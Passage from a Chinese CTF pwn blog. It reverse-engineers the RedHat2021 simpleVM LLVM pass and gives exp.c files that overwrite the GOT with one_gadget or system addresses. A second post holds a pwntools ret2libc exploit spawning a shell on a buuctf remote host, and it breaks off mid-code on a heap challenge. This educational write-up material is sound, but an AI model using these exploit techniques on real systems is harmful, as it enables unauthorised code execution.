<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">runOnFunction</span><span class="params">(__int64 a1, llvm::Value *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">bool</span> v4; <span class="comment">// [rsp+7h] [rbp-119h]</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *Name; <span class="comment">// [rsp+28h] [rbp-F8h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+30h] [rbp-F0h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+94h] [rbp-8Ch]</span></span><br><span class="line"></span><br><span class="line">  Name = (<span class="type">const</span> <span class="type">void</span> *)llvm::Value::<span class="built_in">getName</span>(a2);</span><br><span class="line">  v7 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;o0o0o0o0&quot;</span> )</span><br><span class="line">    v5 = <span class="built_in">strlen</span>(<span class="string">&quot;o0o0o0o0&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v5 = <span class="number">0LL</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v7 == v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">      v8 = <span class="built_in">memcmp</span>(Name, <span class="string">&quot;o0o0o0o0&quot;</span>, v5);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v8 = <span class="number">0</span>;</span><br><span class="line">    v4 = v8 == <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="built_in">sub_6AC0</span>(a1, a2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="step-2-分析runonfunction函数"><a class="markdownIt-Anchor" href="#step-2-分析runonfunction函数"></a> Step 2: 分析runOnFunction函数</h2>
<p>上面的代码就是反汇编出来的runOnFunction函数，和上一篇文章国赛题眼花缭乱的代码段相比，还是友好了不少的，代码的逻辑清晰可见。</p>
<p>首先使用了getName函数获取了Value对象的名字，这里其遍历的是函数名，笔者分享一种看代码的方法：从后往前，执果索因。我们可以看到最后三行是如果v4不等于0就执行sub_6AC0函数，否则就返回。在runOnFunction函数中我们没有发现任何有关于内存空间改动的函数，只有一个strlen和memcmp函数用于进行内存操作，但这两个函数都并不会对内存中对应地址的值产生任何变化。因此漏洞点一定不在runOnFunction函数，需要执行到sub_6A70函数。那也就意味着v4不能等于0。前面的代码中，唯一能让v4可能不等于0的语句就是<code>v4=v8==0</code>。注意这条语句的意思是如果<code>v8==0</code>那么v4=1。看一下汇编代码就可以知道：<br />
<img src="https://img-blog.csdnimg.cn/3eb8402ac80148a8b744564000db10b2.png" alt="" /><br />
这里使用了一个setz指令，它的含义是当标志寄存器中的ZF位为1时，将al的值设为1。因此，我们需要让<code>v8==0</code>才行。不难发现，<code>v8==0</code>的条件就是函数名等于&quot;o0o0o0o0&quot;。因此这个LLVM pass只会对名为&quot;o0o0o0o0&quot;的函数进行一些操作。我们再来到sub_6A70函数看一下执行了什么操作。</p>
<h2 id="step-3-分析sub_6ac0函数"><a class="markdownIt-Anchor" href="#step-3-分析sub_6ac0函数"></a> Step 3: 分析sub_6AC0函数</h2>
<p>下面就是sub_6AC0函数的内容：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">sub_6AC0</span><span class="params">(__int64 a1, llvm::Function *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  llvm::BasicBlock *v3; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+38h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v5[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5[<span class="number">0</span>] = llvm::Function::<span class="built_in">begin</span>(a2);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = llvm::Function::<span class="built_in">end</span>(a2);</span><br><span class="line">    <span class="keyword">if</span> ( (llvm::<span class="keyword">operator</span>!=(v5, &amp;v4) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = (llvm::BasicBlock *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::<span class="keyword">operator</span>*(v5);</span><br><span class="line">    <span class="built_in">sub_6B80</span>(a1, v3);</span><br><span class="line">    llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::<span class="keyword">operator</span>++(</span><br><span class="line">      v5,</span><br><span class="line">      <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的<code>llvm::Function::begin</code>和<code>llvm::Function::end</code>都是Function类的迭代器对象，其迭代的对象是函数中的基本块。因此这个循环的意思就是对每一个基本块执行sub_6B80函数。其中<code>v3 = (llvm::BasicBlock *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,false,false,void&gt;,false,false&gt;::operator*(v5);</code>这条语句中的<code>ilist</code>是LLVM标准库中定义的一个数据结构，与C++标准模板库list类似，但是LLVM中都是使用ilist来存储一个函数的所有基本块或指令，可以将其看成一个列表，针对于LLVM做了一些特殊的优化。那么v3也就是函数中的每一个基本块。我们需要进入sub_6B80函数看一下对这些基本块又进行了什么操作。</p>
<h2 id="step-4-分析sub_6b80函数"><a class="markdownIt-Anchor" href="#step-4-分析sub_6b80函数"></a> Step 4: 分析sub_6B80函数</h2>
<p>这个函数是主要操作，比较长，我们一点点来看。</p>
<h3 id="segment-1"><a class="markdownIt-Anchor" href="#segment-1"></a> Segment 1</h3>
<p><img src="https://img-blog.csdnimg.cn/71a8ddbb33a64a5baffa6290b139980c.png" alt="" /><br />
这一段中可以看到，使用了一个大循环，是对基本块进行遍历。这里的v36变量是从v39变量dyn_cast过来的，这是一个llvm定义的类型转换，不用去管。这里是将v36转换成了Instruction指令对象，然后获取了这个指令的指令码<code>getOpcode(v36)</code>。这个指令码的定义笔者找资料找了好久都没有找到，最终查看源码才发现其定义保存在<code>llvm/IR/Instruction.def</code>文件中，上面的代码意思是指令码需要为55才能进入下一步操作，否则就会直接跳过这个指令去处理下一条指令。我们看一下<code>llvm/IR/Instruction.def</code>文件中哪个指令的指令码是55：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HANDLE_OTHER_INST(55, Call, CallInst)</span><br></pre></td></tr></table></figure>
<p>即Call指令的指令码为55。如果查看上一篇文章中生成的.ll文件就可以发现，函数调用就是用Call指令来表示的。也即o0o0o0o0函数中的所有代码都要是函数调用，其他的代码写了也不会处理。</p>
<p>由此我们可以猜测出v35变量的CallBase指针类型实际上也就是函数调用的对象。源码中的注释说，<code>CallBase</code>对象是所有可以调用的指令的基类，这里“可以调用的指令”包含<code>InvokeInst</code>和<code>CallInst</code>。所有调用的指令都含有：调用的函数自身、零或若干个参数、<font color=blue>零或若干个操作数组以及零或若干个操作数输入 <strong>（原文是operand bundle，笔者不确定这里指的是不是数组的意思，如有错误还请读者指正）</strong></font></p>
<p>下面的<code>getCalledFunction</code>就是获取函数本身，将函数名拷贝到了变量s1中，下面判断函数名是否是pop，如果是判断<code>getNumOperands()</code>函数的结果是不是2。这里需要注意的是，<code>getNumOperands()</code>函数并不是返回函数参数的个数，而是返回一条指令中的变量个数。注意这里的v35变量类型是<strong>CallBase</strong>，是指令<strong>Instructions</strong>的子类，与CalledFunction变量的类型完全不同。随便截取一段.ll文件的代码可以看到call后面会跟上变量名，变量名之前加上@符号说明llvm将其认为是一个变量。因此在这里其实际返回的值应该是函数参数的个数+1。</p>
<p><img src="https://img-blog.csdnimg.cn/6ab8b6a9bb5345c7952c7b0251a30316.png" alt="" /></p>
<h3 id="segmant-2"><a class="markdownIt-Anchor" href="#segmant-2"></a> Segmant 2</h3>
<p>之后我们进入分析当函数名为pop时进行了何种处理。后面的一些变量笔者重命名了一下，读者可以自己打开IDA对照一下。</p>
<p><img src="https://img-blog.csdnimg.cn/fa11fb67d190402ea29f284922e47477.png" alt="" /><br />
pop函数的参数个数应该是1。之后进入内部调用了<code>getArgOperand</code>函数，这个函数是用来返回被调用的函数的第一个<strong>实参</strong>的值，然后v31变量赋值为这个值，并以<code>ConstantInt</code>即整型常量的类型保存。如果这个值不为0，那么再次进行转换，<code>getZExtValue</code>这个函数我们在上一篇文章中见过类似的函数，通过函数名猜测其功能：get Zero Extended Value，即无符号扩展整数。其为1或2时v32变量指向两段内存的地址，这两段内存分别被命名为reg1和reg2。后面又将v3变量赋值为某段内存的二重指针（因为stackdoubleptr变量保存的是一个指针指向内存空间，因此这里表示其为二重指针）。那一段内存空间被命名为stack。hmmm，这样看起来程序中有一个小的vm，有虚拟出来的寄存器和栈，算是和vm题很像了。而且这里的操作也和汇编的pop指令完全相同，将栈顶的值赋值给reg1或reg2，然后栈指针下移8。因此这个vm中栈底在低地址，而栈顶在高地址，与汇编中的栈排列相反。</p>
<p>现在我们知道了这里可能是一个vm，那么分析后面的条件判断就会快上很多了。</p>
<h3 id="segment-3"><a class="markdownIt-Anchor" href="#segment-3"></a> Segment 3</h3>
<p><img src="https://img-blog.csdnimg.cn/6d512bb802574c468b67907810b79d2b.png" alt="" /><br />
下面一个条件判断判断函数名是否是push，想都不用想这一定是入栈操作，将两个寄存器中的一个的值压入栈中，然后栈指针上移。</p>
<h3 id="segment-4"><a class="markdownIt-Anchor" href="#segment-4"></a> Segment 4</h3>
<p><img src="https://img-blog.csdnimg.cn/1017879b626a4fa79bbea190de2ff754.png" alt="" /><br />
当函数名为store时，注意最后的4行代码，出现了指针操作。其将一个寄存器看成指针，将这个地址保存的值拷贝到另外一个地址，这个地址就是另外一个寄存器指定的地址的地址（二重指针）。很明显这里我们可以将任意地址保存到这两个寄存器中。</p>
<h3 id="segment-5"><a class="markdownIt-Anchor" href="#segment-5"></a> Segment 5</h3>
<p><img src="https://img-blog.csdnimg.cn/7387e6cd81ec4d6db90b75e6bd1bacbe.png" alt="" /><br />
当函数名为load时，操作与store类似，但要注意拷贝的方向。store和load函数一定会是我们pwn的重点，至于具体应该如何去pwn，待下面进行调试时再去探索。</p>
<h3 id="segment-6"><a class="markdownIt-Anchor" href="#segment-6"></a> Segment 6</h3>
<p><img src="https://img-blog.csdnimg.cn/223fe7f552d84d47860e1ce3fd19607e.png" alt="" /><br />
add函数加法操作，有两个参数。第一个参数指定寄存器，第二个参数是要加到这个寄存器上的数值。这个函数对于我们的pwn也是有很大意义的。可以构造任意地址。</p>
<h3 id="segment-7"><a class="markdownIt-Anchor" href="#segment-7"></a> Segment 7</h3>
<p><img src="https://img-blog.csdnimg.cn/0d7b3a5139fa4c26a9c7da92cca1e185.png" alt="" /><br />
min函数减法操作，有2个参数，第一个参数指定寄存器，第二个参数是要减去的数值。</p>
<p>至此，源码已经全部分析完毕。我们已经可以在exp中编写6个函数的原型了，注意参数的类型和个数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pop</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">store</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">load</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> reg1, <span class="type">int</span> reg2)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">min</span><span class="params">(<span class="type">int</span> reg1, <span class="type">int</span> reg2)</span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span>&#123;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="step-5-编写expc同时进行调试"><a class="markdownIt-Anchor" href="#step-5-编写expc同时进行调试"></a> Step 5: 编写exp.c，同时进行调试</h2>
<p>现在，我们来着手编写exp，重点需要调试load和store这两个函数的执行。</p>
<p>一开始，reg1、reg2、stack中所有的值都为0，由于本题中opt-8程序没有开启PIE保护，因此其加载基址固定不变，我们可以利用这个获取到其got表中的地址，将其拷贝到reg或stack中。然后在此基础上计算出one_gadget的地址，将其写回到got表，即可执行one_gadget，逻辑很简单。</p>
<p>在这里，我们选择free函数作为地址覆盖的对象，找到opt程序中free函数got表的位置为0x77E100。因此o0o0o0o0函数的第一条语句应该是：<code>add(1, 0x77E100);</code>。然后使用load函数将got表中地址值保存到另一个寄存器中：<code>load(1);</code>。现在我们想要的地址在reg2中，加上相应的one_gadget偏移。与上一题相同，这里使用的是笔者虚拟机的libc而不是题目给的libc：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/Desktop/LLVM/challenges/RedHat2021-simpleVM# one_gadget /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [r12] == NULL || r12 == NULL</span><br><span class="line"></span><br><span class="line">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line"></span><br><span class="line">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == NULL || rsi == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br></pre></td></tr></table></figure>
<p>找到free函数偏移：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/Desktop/LLVM/challenges/RedHat2021-simpleVM# python3</span><br><span class="line">Python 3.8.10 (default, Jun 22 2022, 20:18:18) </span><br><span class="line">[GCC 9.4.0] on linux</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">[*] &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">&gt;&gt;&gt; print(hex(libc.symbols[&#x27;free&#x27;]))</span><br><span class="line">0x9a6d0</span><br><span class="line">&gt;&gt;&gt; </span><br></pre></td></tr></table></figure>
<p>因此，第三条语句应该是<code>add(2, 0x4942e);</code>，这样就得到了第一个one_gadget的地址。第四条语句将其写回到free.got中：<code>store(1);</code>，完成，我们连stack都没有用到。</p>
<p>exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pop</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">store</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">load</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> reg, <span class="type">int</span> val)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">min</span><span class="params">(<span class="type">int</span> reg, <span class="type">int</span> val)</span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span>&#123;</span><br><span class="line">	add(<span class="number">1</span>, <span class="number">0x77E100</span>);</span><br><span class="line">	load(<span class="number">1</span>);</span><br><span class="line">	add(<span class="number">2</span>, <span class="number">0x4942e</span>);</span><br><span class="line">	store(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>尝试运行，发现3个one_gadget都不行，应该是one_gadget的条件不满足。因此考虑写入system函数的地址，然后创建一个名为sh的函数，看看能不能执行到system(“sh”)。system函数的libc偏移为0x52290。</p>
<p>exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pop</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">store</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">load</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> reg, <span class="type">int</span> val)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">min</span><span class="params">(<span class="type">int</span> reg, <span class="type">int</span> val)</span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span>&#123;</span><br><span class="line">	add(<span class="number">1</span>, <span class="number">0x77E100</span>);</span><br><span class="line">	load(<span class="number">1</span>);</span><br><span class="line">	add(<span class="number">2</span>, <span class="number">0x52290</span>);</span><br><span class="line">	store(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sh</span><span class="params">()</span>&#123;&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/4ae5415fedc64a66b9aa38fce02d8396.png" alt="" /><br />
可惜，还是不行。使用原来的libc应该是可以跑one_gadget的，因为有两个one_gadget的条件是栈中某处为0，相对来说更容易满足一些。笔者尝试通过追踪函数调用链获取到VMPass.so的加载基址，但发现VMPass.so的runOnFunction函数是通过call寄存器的方式调用的，目前尚无思路。不过这道题本身还是不难理解的，能够做到修改one_gadget就已经足够了。</p>
<p>下一篇文章笔者将会分析今年（2022）国赛题的satool，看一下和去年的同名题有什么区别。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/buuctf-pwn-write-ups-7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/buuctf-pwn-write-ups-7/" class="post-title-link" itemprop="url">buuctf-pwn write-ups (7)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-02-28 22:28:19 / Modified: 22:54:18" itemprop="dateCreated datePublished" datetime="2023-02-28T22:28:19+08:00">2023-02-28</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index"><span itemprop="name">write-ups</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/buuctf-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">buuctf 系列</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="buu054-jarvisoj_level1"><a class="markdownIt-Anchor" href="#buu054-jarvisoj_level1"></a> buu054-jarvisoj_level1</h1>
<p>又是那个jarvisoj特有的“肠梗阻”问题，远程的消息不发点东西过去它是不会过来的，这题本来是在栈中写shellcode然后返回到栈上执行，但是也可以用ret2Libc。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26705</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.sendline(cyclic(<span class="number">0x88</span>+<span class="number">4</span>) + p32(elf.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(elf.symbols[<span class="string">&#x27;main&#x27;</span>]) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">&#x27;printf&#x27;</span>]) + p32(<span class="number">4</span>))</span><br><span class="line">printf = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>, printf)</span><br><span class="line">base = printf - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">io.sendline(cyclic(<span class="number">0x88</span>+<span class="number">4</span>) + p32(sys) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu055-babyfengshui_33c3_2016"><a class="markdownIt-Anchor" href="#buu055-babyfengshui_33c3_2016"></a> buu055-babyfengshui_33c3_2016</h1>
<p>一道考察堆排布的题目，一共可以添加最多50个用户，每一个用户的信息用两个chunk来保存。第一个chunk保存description，大小可以自由选择，第二个chunk保存第一个chunk的地址加用户名，大小固定为0x80（可写大小）。<br />
<img src="https://img-blog.csdnimg.cn/73152ca45e1c452699153c9429e6e11e.png" alt="" /><br />
需要重点关注一下选项0添加用户中用于读取姓名的函数中的一个检查。<br />
<img src="https://img-blog.csdnimg.cn/8cb5a169ff624ca4bac1c9a9da2d2dd0.png" alt="" /><br />
这个地方检查的是两个堆地址的大小关系。那这个检查到底检查的是什么呢？<br />
ptr存放50个user_info指针，那么&amp;ptr+index应该就是要写入用户名的user_info的地址，查阅汇编代码发现后面的name[120]不明所以，故调试才是最好的理解方式。调试发现，这里实际上检查的是：一个user_info中desc的输入长度是否超限。它的比较方式是：首先输入desc的长度（这里实际上是重复输入，前面已经输入过一次长度，desc的chunk已经分配），然后程序比较&quot;desc+长度&quot;这个地址是否超过了user_info的地址。由于desc先于user_info分配，因此这样检查。如分配的desc可写头部地址为0x8049208，可写大小为0x80，user_info的可写头部地址为0x8049298，在写入desc的时候输入大小为0x40，那么这个检查比较的是0x8049208+0x40和0x804929c（user_info的size）的大小。<br />
如此看来，绕过这个检查的思路就很清晰了。我们想办法让这两个chunk分配的距离远一点，中间还有其他的chunk，而且desc分配在user_info的低地址位置。这样的话我们就可以通过写入desc来覆盖某些chunk。<br />
如下图就是一个简洁的利用思路。<br />
<img src="https://img-blog.csdnimg.cn/88d36196d4874024b720cf2a7c004adf.png" alt="" /><br />
通过堆溢出将user_info #3中的desc指针替换成.got表地址，获取到free函数地址后计算system地址，再写回到got表中，调用free函数即可执行system(‘/bin/sh’)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 